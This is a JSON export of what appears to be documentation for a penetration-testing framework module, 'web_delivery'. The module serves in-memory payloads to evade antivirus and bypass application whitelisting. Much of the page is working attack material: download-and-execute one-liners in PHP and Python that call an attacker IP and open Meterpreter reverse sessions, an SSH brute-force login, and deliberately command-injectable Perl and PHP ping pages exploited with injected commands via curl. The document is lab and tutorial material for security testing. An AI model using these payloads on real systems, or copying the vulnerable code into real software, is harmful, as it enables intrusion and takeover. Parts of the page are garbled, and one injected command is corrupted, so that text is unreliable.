{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/script/web_delivery","result":{"data":{"moduleMetadataJson":{"id":"e5036875-2eb2-5dcf-905f-189539c1529e","name":"Script Web Delivery","fullname":"exploit/multi/script/web_delivery","description":"This module quickly fires up a web server that serves a payload.\n        The provided command which will allow for a payload to download and execute.\n        It will do it either specified scripting language interpreter or \"squiblydoo\" via regsvr32.exe\n        for bypassing application whitelisting. The main purpose of this module is to quickly establish\n        a session on a target machine when the attacker has to manually type in the command:\n        e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution.\n        This attack vector does not write to disk so it is less likely to trigger AV solutions and will allow privilege\n        escalations supplied by Meterpreter.\n\n        When using either of the PSH targets, ensure the payload architecture matches the target computer\n        or use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines.\n\n        Regsvr32 uses \"squiblydoo\" technique for bypassing application whitelisting.\n        The signed Microsoft binary file, Regsvr32, is able to request an .sct file\n        and then execute the included PowerShell command inside of it.\n\n        Similarly, the pubprn target uses the pubprn.vbs script to request and\n        execute a .sct file.\n\n        Both web requests (i.e., the .sct file and PowerShell download/execute)\n        can occur on the same port.\n\n        \"PSH (Binary)\" will write a file to the disk, allowing for custom binaries\n        to be served up to be downloaded and executed.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/multi/script/web_delivery","documentationSlug":"/modules/documentation/exploit/multi/script/web_delivery","referencesSlug":"/modules/references/exploit/multi/script/web_delivery"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>The web_delivery module provides a stealthy way to deliver a payload during post exploitation over HTTP or HTTPS. Because the payload does not touch the disk, it can easily bypass many anti-virus protections.</p>\n<p>The web_delivery module supports three different languages for delivery: Python, PHP, and\nPowershell. You should manually select the correct target based on the victim environment you are exploiting.</p>\n<p>For example, if you have gained remote access through a PHP application, it is likely you can use PHP. If you are in a modern Windows server environment, then you can usually assume the target supports Powershell as well.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To use the web_delivery module, you must first gain access to the target host and be able to execute either a Python, PHP, or Powershell interpreter. Then, follow these steps to proceed with exploitation:</p>\n<ol>\n<li>Start msfconsole</li>\n<li>Run: <code class=\"language-text\">use exploit/multi/script/web_delivery</code></li>\n<li>Run: <code class=\"language-text\">set target 1</code> (1 is PHP. You can use <code class=\"language-text\">show targets</code> to see other options)</li>\n<li>Run: <code class=\"language-text\">set PAYLOAD php/meterpreter/reverse_tcp</code> (You can do <code class=\"language-text\">show payloads</code> to see what options are suitable for the target)</li>\n<li>Run: <code class=\"language-text\">set LHOST IP</code> (The IP the payload should connect back to)</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>At this point, a handler is up for that payload, and the module should instruct you to execute a command.</li>\n<li>Copy the command. Depending on your pentesting scenario, you can either inject the\ncommand into a vulnerable application, or run it from the target's shell and get a session:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(web_delivery) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.2.1:4444\nmsf exploit(web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/z5inGkwCCQiz9\n[*] Local IP: http://10.6.0.86:8080/z5inGkwCCQiz9\n[*] Server started.\n[*] Run the following command on the target machine:\nphp -d allow_url_fopen=true -r &quot;eval(file_get_contents(&#39;http://192.168.2.1:8080/z5inGkwCCQiz9&#39;));&quot;\n[*] Delivering Payload\n[*] Sending stage (33684 bytes) to 192.168.2.134\n[*] Meterpreter session 1 opened (192.168.2.1:4444 -&gt; 192.168.2.134:41684) at 2016-03-02 11:41:34 -0600</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<p><strong>Python</strong></p>\n<p>Python is a popular language, especially on Unix-based systems. It has shipped by default with Ubuntu Linux since version 8.04, Mac OS X since version 10.3, and is widely available on other systems as well.</p>\n<p><strong>PHP</strong></p>\n<p>PHP is often found on web servers, especially in shared hosting environments. It is the basis for popular web applications such as WordPress, Joomla, and Drupal.</p>\n<p><strong>Powershell/Windows</strong></p>\n<p>Powershell is a popular language on modern Windows systems, largely replacing batch files and Windows Scripting Host for Windows automation. Windows 7 and Windows Server 2008 R2 were the first versions to come with Powershell by default. Older Windows systems, such as XP and Server 2003, can still have it installed as an optional component.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Against a compromised web application</strong></p>\n<p>web_delivery works nicely against a web application with a command execution vulnerability. One way to approach this would be:</p>\n<ol>\n<li>Start exploit/multi/script/web_delivery</li>\n<li>Use <a href=\"https://portswigger.net/burp/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Burp Suite</a> to intercept the HTTP/HTTPS request, place the command in the parameter that results in arbitrary code execution.</li>\n<li>If the modified HTTP/HTTPS request is successful, you should get a session.</li>\n</ol>\n<p><strong>Shell upgrade</strong></p>\n<p>web_delivery is also useful to upgrade a shell type payload to a Meterpreter one. Here's how that can be done:</p>\n<ol>\n<li>Start <code class=\"language-text\">exploit/multi/script/web_delivery</code> that generates the command to inject.</li>\n<li>Interact with the shell, and copy/paste the command.</li>\n<li>You should get a Meterpreter session.</li>\n</ol>\n<p>An example of this process can be seen below where an Ubuntu 14.04 victim is first exploited through <code class=\"language-text\">auxialiary/scanner/ssh/ssh_login</code>, and then upgraded via <code class=\"language-text\">web_delivery</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.156\nrhosts =&gt; 192.168.2.156\nmsf auxiliary(ssh_login) &gt; set username ubuntu\nusername =&gt; ubuntu\nmsf auxiliary(ssh_login) &gt; set password ubuntu\npassword =&gt; ubuntu\nmsf auxiliary(ssh_login) &gt; run\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.117:35219 -&gt; 192.168.2.156:22) at 2017-03-05 19:57:53 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ssh_login) &gt; use exploit/multi/script/web_delivery\nmsf exploit(web_delivery) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(web_delivery) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using URL: http://0.0.0.0:8080/DovbvqRaB\n[*] Local IP: http://192.168.2.117:8080/DovbvqRaB\n[*] Server started.\n[*] Run the following command on the target machine:\npython -c &quot;import urllib2; r = urllib2.urlopen(&#39;http://192.168.2.117:8080/DovbvqRaB&#39;); exec(r.read());&quot;\nmsf exploit(web_delivery) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\npython -c &quot;import urllib2; r = urllib2.urlopen(&#39;http://192.168.2.117:8080/DovbvqRaB&#39;); exec(r.read());&quot;\n[*] 192.168.2.156    web_delivery - Delivering Payload\n[*] Sending stage (38500 bytes) to 192.168.2.156\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.156:35840) at 2017-03-05 19:59:44 -0500\n\n^Z\nBackground session 1? [y/N]  y\n\nmsf exploit(web_delivery) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; sysinfo\nComputer     : Ubuntu14\nOS           : Linux 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016\nArchitecture : x64\nMeterpreter  : python/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"vulnerable-pages\" style=\"position:relative;\"><a href=\"#vulnerable-pages\" aria-label=\"vulnerable pages permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Pages</h2>\n<h3 id=\"perl-cgi\" style=\"position:relative;\"><a href=\"#perl-cgi\" aria-label=\"perl cgi permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Perl cgi</h3>\n<p>These instructions will create a cgi environment and a vulnerable perl application for exploitation. We used Kali rolling (2016.2) for this tutorial.</p>\n<h4 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<p>In this example, we make a <code class=\"language-text\">post</code> form that pings a user provided IP, which is a typical funtion on many routers and is often abused a similar manner.</p>\n<ol>\n<li>Enable cgi: <code class=\"language-text\">a2enmod cgid</code></li>\n<li><code class=\"language-text\">mkdir /var/www/cgi-bin</code></li>\n<li>Enable folder for cgi execution: add <code class=\"language-text\">ScriptAlias &quot;/cgi-bin/&quot; &quot;/var/www/cgi-bin/&quot;</code> to <code class=\"language-text\">/etc/apache2/sites-enabled/000-default.conf</code> inside of the <code class=\"language-text\">VirtualHost</code> tags</li>\n<li>\n<p>Create the vulnerable page by writing the following text to <code class=\"language-text\">/var/www/cgi-bin/example.pl</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">#!/usr/bin/perl\nuse CGI qw(:standard);\n$query = new CGI;\nprint $query-&gt;header( -type=&gt; &quot;text/html&quot;),\n  $query-&gt;start_html();\n$query-&gt;import_names( &#39;Q&#39; );\nif ( $Q::ip ) {\n  print `ping -c 1 $Q::ip`, &quot;&lt;hr&gt;&quot;;\n}\nprint $query-&gt;start_form( -name=&gt;&quot;ping&quot;, -method=&gt;&quot;POST&quot;, -enctype=&gt;&amp;CGI::URL_ENCODED),\n  $query-&gt;p(&quot;Enter IP to ping:&quot;),\n  $query-&gt;textfield(-name=&gt;&quot;ip&quot;), #, -id=&gt;&quot;ip&quot;),\n  $query-&gt;submit(-name=&gt;&quot;submit&quot;),\n  $query-&gt;end_form(),\n  $query-&gt;end_html();</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Make it executable: <code class=\"language-text\">chmod +x /var/www/cgi-bin/example.pl</code></li>\n</ol>\n<p>We can verify this page is exploitable by chaining commands so instead of submitting <code class=\"language-text\">127.0.0.1</code> we'll submit <code class=\"language-text\">127.0.0.1;whoami</code>.</p>\n<p><code class=\"language-text\">curl -X POST http://127.0.0.1/cgi-bin/example.pl --data-urlencode &quot;ip=127.0.0.1;whoami&amp;submit=submit&quot;</code></p>\n<p>or via GET request:</p>\n<p><code class=\"language-text\">curl &quot;http://127.0.0.1/cgi-bin/example.pl?ip=127.0.0.1%3Bwhoami&amp;submit=submit&quot;</code> (note url encoding)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;!DOCTYPE html\n\tPUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;\n\t &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;en-US&quot; xml:lang=&quot;en-US&quot;&gt;\n&lt;head&gt;\n&lt;title&gt;Untitled Document&lt;/title&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;\n&lt;/head&gt;\n&lt;body&gt;\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms\nwww-data\n&lt;hr&gt;&lt;form method=&quot;post&quot; action=&quot;/cgi-bin/example.pl&quot; enctype=&quot;application/x-www-form-urlencoded&quot; name=&quot;ping&quot;&gt;&lt;p&gt;Enter IP to ping:&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;ip&quot; value=&quot;127.0.0.1;whoami&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h3>\n<ol>\n<li><code class=\"language-text\">use exploit/multi/script/web_delivery</code></li>\n<li><code class=\"language-text\">set lhost 192.168.2.117</code></li>\n<li>\n<p><code class=\"language-text\">exploit</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Exploit running as background job.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n</ol>\n<p>[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using URL: <a href=\"http://0.0.0.0:8080/vNPlsjE\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://0.0.0.0:8080/vNPlsjE</a>\n[*] Local IP: <a href=\"http://192.168.2.117:8080/vNPlsjE\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/vNPlsjE</a>\n[*] Server started.\n[*] Run the following command on the target machine:\npython -c \"import urllib2; r = urllib2.urlopen('<a href=\"http://192.168.2.117:8080/vNPlsjE&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/vNPlsjE'</a>); exec(r.read());\"\nmsf exploit(web_delivery) ></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Now browse to the site, and submit the form with the text `127.0.0.1;python -c &quot;import urllib2; r = urlli7:8080/vNPlsjE&#39;); exec(r.read());&quot;`. If the site seems to freeze, exploitation was most likely successful.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>[*] 192.168.2.117    web_delivery - Delivering Payload\n[*] Sending stage (38500 bytes) to 192.168.2.117\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -> 192.168.2.117:47660) at 2017-03-04 14:52:38 -0500</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">or we can exploit via curl after escaping the double quotes.  Note we use `--data-urlencode` to automatically encode for us:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>msf exploit(web_delivery) > exploit\n[*] Exploit running as background job.</p>\n<p>[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using URL: <a href=\"http://0.0.0.0:8080/OKNzr8B59zWp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://0.0.0.0:8080/OKNzr8B59zWp</a>\n[*] Local IP: <a href=\"http://192.168.2.117:8080/OKNzr8B59zWp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp</a>\n[*] Server started.\n[*] Run the following command on the target machine:\npython -c \"import urllib2; r = urllib2.urlopen('<a href=\"http://192.168.2.117:8080/OKNzr8B59zWp&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp'</a>); exec(r.read());\"\nmsf exploit(web_delivery) > curl -X POST <a href=\"http://127.0.0.1/cgi-bin/example.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://127.0.0.1/cgi-bin/example.pl</a> --data-urlencode \"ip=127.0.0.1;python -c \"import urllib2; r = urllib2.urlopen('<a href=\"http://192.168.2.117:8080/OKNzr8B59zWp&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp'</a>); exec(r.read());\"&#x26;submit=submit\"\n[*] exec: curl -X POST <a href=\"http://127.0.0.1/cgi-bin/example.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://127.0.0.1/cgi-bin/example.pl</a> --data-urlencode \"ip=127.0.0.1;python -c \"import urllib2; r = urllib2.urlopen('<a href=\"http://192.168.2.117:8080/OKNzr8B59zWp&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp'</a>); exec(r.read());\"&#x26;submit=submit\"</p>\n<p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\nDload  Upload   Total   Spent    Left  Speed\n0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n[*] 192.168.2.117    web<em>delivery - Delivering Payload\n[*] Sending stage (38500 bytes) to 192.168.2.117\n[*] Meterpreter session 4 opened (192.168.2.117:4444 -> 192.168.2.117:47688) at 2017-03-04 15:02:35 -0500\n100  1172    0   981  100   191    233     45  0:00:04  0:00:04 --:--:--   233\n100  1172    0   981  100   191    158     30  0:00:06  0:00:06 --:--:--     0^CInterrupt: use the 'exit' command to quit\nmsf exploit(web</em>delivery) > sessions -l</p>\n<h1 id=\"active-sessions\" style=\"position:relative;\"><a href=\"#active-sessions\" aria-label=\"active sessions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Active sessions</h1>\n<p>  Id  Type                      Information   Connection</p>\n<hr>\n<p>  4   meterpreter python/linux  www-data @ k  192.168.2.117:4444 -> 192.168.2.117:47688 (192.168.2.117)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">### PHP\n\nIn this example we make a `post` form that pings a user provided IP, which is a typical function on many routers and is often abused in a similar manner.\n\n1. Enable cgi: `a2enmod php7.0`\n2. Create the vulnerable page by writing the following text to `/var/www/html/example.php`:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<html>\n  <body>\n    <?php\n      if ($_POST[\"ip\"]){\n        print( shell_exec('ping -c 1 '.$_POST[\"ip\"]) . \"<hr>\");\n      }\n      print(\"<form method=\\\"post\\\"\n             action=\\\"/example.php\\\"\n             enctype=\\\"application/x-www-form-urlencoded\\\"\n             name=\\\"ping\\\">\n             <p>Enter IP to ping:</p><input type=\\\"text\\\" name=\\\"ip\\\" value=\\\"\\\" />\n             <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"submit\\\" /></form>\");\n    ?>\n  </body>\n</html>\n```\n<p>We can verify this page is exploitable by chaining commands so instead of submitting <code class=\"language-text\">127.0.0.1</code> we'll submit <code class=\"language-text\">127.0.0.1;whoami</code>.</p>\n<p><code class=\"language-text\">curl -X POST http://127.0.0.1/example.php --data-urlencode &quot;ip=127.0.0.1;whoami&amp;submit=submit&quot;</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;html&gt;\n  &lt;body&gt;\n    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms\nwww-data\n&lt;hr&gt;&lt;form method=&quot;post&quot;\n             action=&quot;/example.php&quot;\n             enctype=&quot;application/x-www-form-urlencoded&quot;\n             name=&quot;ping&quot;&gt;\n             &lt;p&gt;Enter IP to ping:&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;ip&quot; value=&quot;&quot; /&gt;\n             &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;  &lt;/body&gt;\n&lt;/html&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"exploitation-1\" style=\"position:relative;\"><a href=\"#exploitation-1\" aria-label=\"exploitation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 